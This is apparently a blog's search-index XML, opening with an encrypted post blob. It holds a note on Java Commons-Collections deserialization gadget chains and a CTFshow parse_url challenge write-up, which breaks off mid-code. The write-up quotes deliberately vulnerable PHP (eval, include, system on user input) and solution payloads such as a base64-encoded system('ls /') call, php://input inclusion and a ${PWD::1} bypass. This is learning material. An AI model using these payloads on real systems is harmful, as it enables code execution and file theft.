4ef09332198062b8e21ef1fd49a18c85728038530d717a9b1076e3941bbf2faf30011ae527fcb0e023fc6cce258234468104a712fb8fa129c0e57745fe13e892ae57bd86f6c5c133288a15e17d5636e46cd28dbbfcf9b10df8d4c5070e2500e1e7c1768fc08e1833dc973772eaf904dc96cf72afc338d4a57a49a20d0969e93e0b649604d41b38d8a0da3230eefccc05f410ab6bee5e2c90c07ec4ac3ee3c5c4af3fe12aaf4c56c4ae4565901a5089925879fcce7f6769e0623f2e16aecc80b4effcc37b7d8d9abcf5090ea93f9a455131b74073d92589de07b2c32a556defdafe2ab229f207f1d235b86e949987f2664b5ecb888eab139dc220db7827ed75df8d19dfa25ba786fbc83a0baa9dbb7feee1a6386f04fcd8424a5da2a6eaa3546c9b2693b48d013be1ed7bc7c81890f7f80746ebf3e76c55231d9e58a855ecc176d6d5f0dd0df7a6690e25e9baaf8fab80c065a476f19c72ff883fcaa8ed6dd31be18287735e6fc78b7ca2f40b7eed40f145bc2bc0d68fb0fc1cc76e6933912b2d814af6e7b5f6defe7d2202631a062ead78d89ffac605ff0b8bb28fc75edab0342cc13f6827d5fdb75dec7b1319804b8e53490f3c58b6f19c0e54f2c38251d3a332e0f012da74104cad8500647b00908f16a20fbe0d29149b99842f281443f8c6a505fbb550a3bf87f4e0d479fb3498867f2bcacb962c5672334306efc7c6854d37d8c8cd26a87bc1f2b68ed79dee3a7b0b0b7fee33c95828da51ccb0a4f663ae439167cfd16e231b40d82610ec5cde182c5612b45be924e1c8ce3607a6317a2590bd172d27baf3d9dd02b4a8bbcdcc7ea9863ea938916b5aad192c7f94e14ab0162f1095fe102836f3252ae07e9a98211da766769c994b9745a0ec116f3c7876326880bef8709fe8ceaded8567218c571320894601f18d0d1c113343d81e6035db2b3ef4641e2a9f3828ca9619c39753d9530e0ee9b089c76258255e8e93b69b8258c1a20174af3bdc5bbda7e171ca0dd3999f960ec667bd7d5de35d6c8943ebc61baabf2b33e96d1735e1da5150bc124f9ed200eccca36e8ccf049e5dd2f35b3bc52aa40f3ab9e357f4f8fc3e3b4ec6be0972ddaa87d66e2c65a92321a840d258724c75b04806cd8187e2ccc9ebb0d680ad5217a1002d94ac84184e797b277af585b7dc4d30634793ab4c6492e1834e2d12064b0d66948c432fe7f7a72522e14f90b07e1fe658a0edfa45aa4a3e82ffa7afd76bb7bd04905c3fcfb536f0d3535773c7bcff65bc144978ac81a9fea9818f82cc2261d33a8f4049cd40de34e36be2e7bb07206adc1d073391f44910bb539b606b1c7cb102cd6862bb5eca21f706bb925177299568cf48d007a86b591237ef6f78914bb87da1f4d7ecbd4a6aeea9de4fc46e89e52b844222da281c3ba689d26bde718852653b3775c5cd494ba0042b49b1118046adfadaa2dfb2121c1394c4fea54a91b3faf6799f7ba00e265ee30990f6439bd74a1739cfcdf37c96bf4ab15231e6f780bb8d004b9270865f5e7cd7d51783a7b0dcb07f90a037559f738e1006873ce30470d90e60fecb7d9733099a2e9a460f98bae85d6d69fc1ec8f51464e0e200627551facf4cab2d1e6e51b56d36991e526bb2201a7aef8dc72a5f0ef8db6d16a3f98b4d5fcb5c60530fd43670240de430d804de1455e0b8405199dd1c8e1da2a18b4f26941a62f98ec6cbaddf30198683ff74108a0ea9876d4cc3e38e5eab68f5154a04ebac0bd74e9137dbe78e7b0cf1364b05b064afd4b62cf5bb132bc8f219367928c5f3d06d561f1c60bf7dd03de26c8da6b6ddbc0825edaa8fcb085e39a76085c88dc847d273a2354ca3842e65fd4141c0336666d72e72e2c457e28f23c31871b7d9ad0b8daad928c13425767f96e52fbf0eca822823cd67f640870b826d4e976dcad41e2ef9607b481ea59b6146c32feb5a48d156bb6d9cc7e14cf615f789ac91007d6f7f4df04ba10215a48b96e08a9d8724be930b91e9c451af671c97e063b8d7695fa092b2c14b232e029ac740783e2afce0c4dab7eae84747a66bcbf5900f0ddaf243e67463d053db836fa7bfdf20114278bc8dd251533c79d127ce95363351e95a96f14ae926ffc0ceef54fd60f35d5ed3e5e4bdb4644255db888717bcb7e3d9fc4210ffd1ad3a486a5194bae49bc8df5dd47381e0d9106737cb72fd047d921ec423cf9e878109eb758cc34e360f36d7969e13903826da294e99f8036d549e6c85f7fb84ae436f89e1d416ade9c95b98d19fe181374678696398166bce2bd8ad62af46355715eddf10e65f8c727348844012c7a250a76ceee54a5d36b20bac283db30e8f7ac7854f44833c8ddc7b2685a57992f7e84b6cf273a7fea79360d36c16fd94f70f5c135b8ed8b834e17ab10b28bc3f21f782dd1368c56f5cb6b1f068d44e749117b99038486effc071a3ebf642bd71d04713c3b0a3cd0d71792aa7a92cf7b33b0ef7e2efc2f7877c956789edd38428d6febd0359a4880e1c70ba3170fb9d2d24be5fdc74bd6fd57a156561ad329f43bb75fbf2d65bfb6528809d98a28191c03ad44541e9d60747f4d939f3152cde0433666f23e12a21613b0a5e10e16c0b45892b0aa478f5f3489e44af0c50c7e7114ecc9778fd817b393c1958349a8012bfd7324540cdf8c223dc646fcfcb455fc5109f784973a67c6c2d0bc974a67e03fbe446a014c8641e079647493a51fb8d92e00aa0ee6da4743ac880d685b5f3133b9b7057d700f72231473f402de45b116e4a5e5f45417db82465a2231fef5215b5f5600cdd4d3d608a407a300da0b8638cc4552bc54c5a8d7ce2b05fca347a99ab05591211d45ace4d6f4d8d7a23b260a6b3beea44a0eb7686da252a1d3e4a9cd32b0a133770ae0e743b5d7bf87f43db679e7d2d31a9557d120096d4a3d8defed0b8996db1700c19dac80db595ac236397c8b21aecba2fe237cfea3a44bb31925b009a82e0aeaac540e68d56efc08a31090af2368e784dc81e031206446c9accc9091c3770f0c75386993a02f22aad228402a4ca18eb9296bdbb10123e94a509987e9d2f73bc64a743edd85675487d613d10c6a576ceff0f03d49afaea874e72bddc016cfffb8ca507c2192b1f34d333a691849e28f35a8074fe4d0143f7036168588215b5991aa485c2bb66a8a23ddf383b5835458af24280644f1bf596862d5bb625b4d256644f0d5c9bf507071bc5db689bd0bf4995f6d1601c042292af7c5b20d245ae5cf5b6283d7121113a07edb4062a5c5a7ed2300f727cdfa168e671905de4cc44eb2ca0c83b2211ce8e9c167ec3de03147337ced7ad956f0c4547d514409f2a53ff55cc4eb06f5a84cb3dcc6eaa6d7bfa3e58e533b910eae5267fb75ce099a1e23251208cf1383bd8eb1a2d2452de67bbd4b66c9e17e4bd7a1f6819ddcfcdbf672de783b320e3343f0fcb319599baf06cae8add1a106c8043ec1c869de5284506cd30bb1fd200c5f846fc5be7d5e23151c2a7cdf5ecd79f29d38e7787a10dd5b27bbca8e7e8978d1e0a75d0800fa7bda66f417632dfa033e02149041e1edd29702dc8de199efec0bd90bc04514befc0773bac0528c55ad5fd6763ae51a2939b3171cfaf4cbe6c1f02cbb31bb5a69a3e5e4af1bea67b8fadc20ad43a8b23113fec037f34e82d829879aa911bd2d1c67ff43db0da0f961e08d90fd4045ba7104f18ec23e80483d3bcf237c75ca520a2411224aebfcb398f78149fb14f33d77c3459f98d89cb655fc4b9c8eef86738c897dc635e0cddd8a081b7ee89133d37ab58aa9816ef2da4dbe480e70e420aea6c5676648dafa89c5f3e1745369189a71e581e6dec507e75414539521cb09d0ee647ef580314ebae8abfc2a1e108d394b2c206c4ff3a4409d89199df84f33490e9fbab98b6d8bc9df54fb11f432f89d5839ee6855e57ca2f6e1a65404fb88bd7acd86a111f08790edeff61855a5cda2d6ef7d12ab5eda36ba6fd205f34d1310eee0f86388f91d98942779a89e6df131a044250fe7fe8629cad086899d45b04eda1d06dcf1364a4b44bd611e1c8c5d6be20e4fada6e2e8bda5e17f6a70deb9c86fa0aa10363481d55c1aa83a4d5ca5c7b5936c30364e179ab1052b29245e7a3636561401257f996e0418a58fe8fc79795e22217973c0ffecc551ea07d04e1db5b5cfab5bcb925a8ad41687e1211989341be01b8951a22be36980d02912aa19c9b2a40cfb96e07df6912b0980f7e2c464a5ee4b5e43160ebe17692b8359bcf5324c92101e773143b6d169acb8b3eadfd0fb9a4c15a359710f2ed3dcddf995aca365a1ab0de5e2ac1fb0fd595fecb8e8aba007fa8c0e4b9912a462a35257a5ecf8ff3f08d524b6e9a2099547e68edc7471368d1fa1cd0499a29861ac98d0d9261afcdf70334049c7d82861671771a28b2abc1610bf1a23a0fb515e97e794f4a4a76f5f7e251d643b13aa387f054ebf423e6c3c2feed34c15518d3805c9b5b92cec79ee95c17e68ade26bee0be0f9580876f2cd88f2f6969cc641d256d0ad4b7443daaf528347886f63b545b44e5c869cf267d5f1700e53406925d3a34eee520c24daf384fbf32a74425b2d2fd0657d3a1a3f581e688bcd4aec98e8b7505c602706a8bc50458ed776b8621cab2accd5e0be1bf00218a9f87f17ba85c3d4b51e561a805a7facb2c201539c1fded9295a5498901590699ae5461a5f6bb1848315df368a1cce77385f2f19cfde4cd4cd5348af7271d0e6ac67a12b5de0f983495c0f4199ad15391914cabaa9011b1f90d4a4aa92cb4f8ed77f46e4555930f41a3a0fb12f0217225ccfa1781deb7502c4a4272e6b3123f624edd92f907d971cb539c8946a5f321c6754b73aa238db20bbf6aef8afba553260eec0d6696cfafe4febb66be918c1c04201459bf745005a1685e7cfd6ccc2d6d99766f76f4f9e9844862eb3272ffd94f9d5a2e795e5007a9e4da9b33a81a34b1bd50d2d258b95f63ee5fd5ecda3fab4a1850d8e3347fd0c1ee189e9668a40dfc744b7573de5dedb9f7ca7f3881c751065001ece367cd1feface5b68875abf82ace5e0b2f45de906fc111d65719efdcbf5bd8c34fd4f7dd13251fd2b803aff6278268b78034a98df727425d1ba3a7d38ca7a8d55ac8a5f478c31d32bcc8fe8b7f3933d05f5ac7130ec96d87f3ece6786ca203e5066b910d5926d55fbc0d0d992396728c71ce34a</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">当前文章暂不对外可见，请输入密码后查看！</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
        <tags>
            
            <tag> show-代码执行 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-cc2+cc4+cc5+cc7</title>
      <link href="/posts/858f6c3d.html"/>
      <url>/posts/858f6c3d.html</url>
      
        <content type="html"><![CDATA[<p>这里的话是导入cc4的maven依赖</p><p><img src="../images/image-20230521192554529.png" alt="image-20230521192554529"></p><h2 id="CC4"><a href="#CC4" class="headerlink" title="CC4"></a>CC4</h2><p>这里cc4和前面的不同是在调用<code>transform</code>方法的不同</p><p><img src="../images/image-20230521194855536.png" alt="image-20230521194855536"></p><p>然后就是接着找谁能调用这个<code>compare</code>方法了</p><p>根据发现这条链子的作者写的文章来看</p><p>入口点是<code>PriorityQueue</code>这个类</p><p><img src="../images/image-20230521195351157.png" alt="image-20230521195351157"></p><p>然后就到<code>heapify()</code></p><p><img src="../images/image-20230521195429690.png" alt="image-20230521195429690"></p><p>然后接着是<code>siftDown</code>函数</p><p><img src="../images/image-20230521195509503.png" alt="image-20230521195509503"></p><p>然后接着是<code>siftDownUsingComparator</code>函数</p><p><img src="../images/image-20230521195535898.png" alt="image-20230521195535898"></p><p>这里的话就和上面的方法对应上了</p><p>这里的话都是在<code>PriorityQueue</code>这个类里边进行调用那么因为<code>comparator</code>参数可控，所以就可以直接调用<code>TransformingComparator.compare()</code>方法了，然后就可以调用这个方法里边的<code>transform</code>方法了</p><p>最终目的都是为了调用到<code>ChainedTransformer.transform</code>方法</p><p>这里的话就会有疑问，就是为什么这里的链子在<strong>cc3</strong>里不能用，<code>PriorityQueue</code>是jdk里的类，那么出问题的肯定不是他，而是<code>TransformingComparator</code>这个类的问题</p><p><img src="../images/image-20230521202532028.png" alt="image-20230521202532028"></p><p><img src="../images/image-20230521202543387.png" alt="image-20230521202543387"></p><p>就是因为cc3里的这个类没有继承<code>serialize</code>所以就不能进行序列化操作，所以问题就出现在这里了</p><p>这里因为啥设的这些参数我这里就不写了  <a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">视频这里有讲</a></p><p><strong>接下来就懒得跟了，就是修改调用<code>transform</code>方法的变式罢了</strong></p><p><img src="../images/image-20221010090837206.png" alt="img"></p><p>就是跟着这张图片来找就行了</p><p>cc链子可以用很多种方法来互相组合来进行调用，就是可以用执行代码和调用<code>transform</code>的方法来进行排列组合掉用</p><p><strong>理论上应该只有1和3受jdk版本影响</strong></p><p><a href="http://miku233.viewofthai.link/2022/10/10/Commons-Collections2%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">这是b站评论大佬写的总结</a></p><p><a href="https://www.bilibili.com/video/BV1NQ4y1q7EU/?spm_id_from=pageDriver&amp;vd_source=bacfffe46b930fda5761b63367eb298c">b站视频</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java反序列化-cc2+cc4+cc5+cc7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java-二次反序列化</title>
      <link href="/posts/6c257651.html"/>
      <url>/posts/6c257651.html</url>
      
        <content type="html"><![CDATA[<p><a href="http://tttang.com/archive/1701/#toc_">二次反序列化</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java-二次反序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ctfshow-周末大挑战-parse_url</title>
      <link href="/posts/153b575d.html"/>
      <url>/posts/153b575d.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://ctf-show.feishu.cn/docx/Al7GdBB5WoI9pMxod9acyzXFnfe">官方wp</a></p><p><strong>看了wp之后，学到了一个新技巧</strong></p><p>就是在<code>/</code>用不了的时候，我们可以使用先进行编码，然后在进行解码的方式来进行绕过</p><p>例如   <code>eval(base64_decode(&#39;c3lzdGVtKCJscyAvIik7&#39;));</code></p><p>这里的话先介绍一下这个<code>parse_url</code>函数</p><p>这里话在ctfshow的web入门里也有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&#x27;http://user:pass@host/path?args=value#anch&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>, PHP_URL_PATH);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果--------------------------------------------------------------------</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [scheme] =&gt; http</span><br><span class="line">    [host] =&gt; host</span><br><span class="line">    [user] =&gt; user</span><br><span class="line">    [pass] =&gt; pass</span><br><span class="line">    [path] =&gt; /path</span><br><span class="line">    [query] =&gt; args=value</span><br><span class="line">    [fragment] =&gt; anch</span><br><span class="line">)</span><br><span class="line">/path</span><br><span class="line">    </span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="第一关"><a href="#第一关" class="headerlink" title="第一关"></a>第一关</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-10 10:58:34</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>这里的host的话就是<code>http://xxxx/</code>   里面的xxx，那么这里可控，于是就尝试看能不能进行命令执行</p><p><img src="../images/image-20230515175832497.png" alt="image-20230515175832497"></p><p>能成功进行命令执行，于是尝试文件读取</p><p><img src="../images/image-20230515180225448.png" alt="image-20230515180225448"></p><p>这是其中一种解法</p><p><strong>这里的 <code>/</code>用不了是因为在/的后面会被<code>parse_url</code>解析成path</strong></p><p><img src="../images/image-20230515180454024.png" alt="image-20230515180454024"></p><p>这是第二种解法</p><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:25:53</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>做这里的时候可以使用bp来做，hackbar可能识别不成功</p><p>这里的想法是构造<code>php://input</code></p><p><img src="../images/image-20230516143313335.png" alt="image-20230516143313335"></p><p>这里的host是<code>php:</code>   path是<code>//input</code></p><p>然后就可以拼接成<code>include php://input</code>   、</p><p>然后在post执行代码就能够成功执行了</p><p><img src="../images/image-20230516143456418.png" alt="image-20230516143456418"></p><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$data</span>[<span class="string">&#x27;scheme&#x27;</span>].<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>];</span><br></pre></td></tr></table></figure><p>还是考察的拼接方法</p><p><img src="../images/image-20230516143959148.png" alt="image-20230516143959148"></p><p>本地尝试了一下</p><p><img src="../images/image-20230516144016789.png" alt="image-20230516144016789"></p><p>可以成功命令执行了</p><h3 id="第四关"><a href="#第四关" class="headerlink" title="第四关"></a>第四关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:35</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$data</span>[<span class="string">&#x27;host&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>还是先本地构造来进行尝试</p><p><img src="../images/image-20230516144313226.png" alt="image-20230516144313226"></p><p>这里发现成功后，这里不能用<code>/</code>的原因是因为会被识别成path</p><p><img src="../images/image-20230516144743961.png" alt="image-20230516144743961"></p><p>这里的话使用<code>$&#123;PWD::1&#125;</code>来替代<code>/</code>也行</p><p><img src="../images/image-20230516145016184.png" alt="image-20230516145016184"></p><p>不过这里的话要在这个<code>$&#123;PWD::1&#125;</code>的后面加上一个<code>:</code>,不然不会执行成功</p><h3 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]));</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$$$$$$host</span>;</span><br></pre></td></tr></table></figure><p>这里话<code>extract</code>，考察的是个变量覆盖的题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;Original&quot;</span>;</span><br><span class="line"><span class="variable">$my_array</span> = <span class="keyword">array</span>(<span class="string">&quot;a&quot;</span> =&gt; <span class="string">&quot;Cat&quot;</span>,<span class="string">&quot;b&quot;</span> =&gt; <span class="string">&quot;Dog&quot;</span>, <span class="string">&quot;c&quot;</span> =&gt; <span class="string">&quot;Horse&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$my_array</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\$a = <span class="subst">$a</span>; \$b = <span class="subst">$b</span>; \$c = <span class="subst">$c</span>&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">结果-------------------------------------------------------------------</span><br><span class="line"><span class="variable">$a</span> = Cat; <span class="variable">$b</span> = Dog; <span class="variable">$c</span> = Horse</span><br></pre></td></tr></table></figure><p>这就是这个函数的用法</p><p>就是把数组里的<code>key</code>作为变量名，把数组里的<code>value</code>作为变量的值</p><p>就是一个套娃的过程</p><p><img src="../images/image-20230516152003470.png" alt="image-20230516152003470"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$host</span>=scheme</span><br><span class="line"><span class="variable">$$host</span>=<span class="variable">$scheme</span>=user</span><br><span class="line"><span class="variable">$$$host</span>=<span class="variable">$user</span>=pass</span><br><span class="line"><span class="variable">$$$$host</span>=<span class="variable">$pass</span>=fragment</span><br><span class="line"><span class="variable">$$$$$host</span>=<span class="variable">$fragment</span>=query</span><br><span class="line"><span class="variable">$$$$$$host</span>=<span class="variable">$query</span>=php:<span class="comment">//input</span></span><br></pre></td></tr></table></figure><p>这里的话传入参数的时候要会<code>#</code>进行url编码</p><p><img src="../images/image-20230516152215558.png" alt="image-20230516152215558"></p><p><img src="../images/image-20230516152318971.png" alt="image-20230516152318971"></p><h3 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h3><p>题目</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2023-05-10 09:52:06</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2023-05-12 13:29:18</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">parse_url</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$data</span>[<span class="string">&#x27;path&#x27;</span>], <span class="variable">$data</span>[<span 